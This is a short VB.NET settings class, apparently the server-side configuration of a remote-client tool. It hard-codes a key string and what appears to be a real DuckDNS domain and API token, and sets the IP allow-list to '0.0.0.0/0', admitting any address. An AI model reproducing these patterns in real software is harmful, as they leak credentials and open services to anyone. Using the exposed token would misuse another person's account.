Public Class Settings
    Public Shared Ports As New List(Of Integer)
    Public Shared KEY As String = "K9@xR#2mL$vN8pQ&wT4bF!sD5cG7jH*3"
    Public Shared ReadOnly VER As String = "v1.8"
    Public Shared Online As New List(Of Client)
    
    ' IP Whitelist for connections - Allow any IP for testing
    Public Shared AllowedIPs As New List(Of String)({"0.0.0.0/0"})
    
    ' DuckDNS Configuration
    Public Shared ReadOnly DuckDNS_Domain As String = "lipspade.duckdns.org"
    Public Shared ReadOnly DuckDNS_Token As String = "49686f8a-bfdd-4d69-922c-406dd346b5e8"
End Class
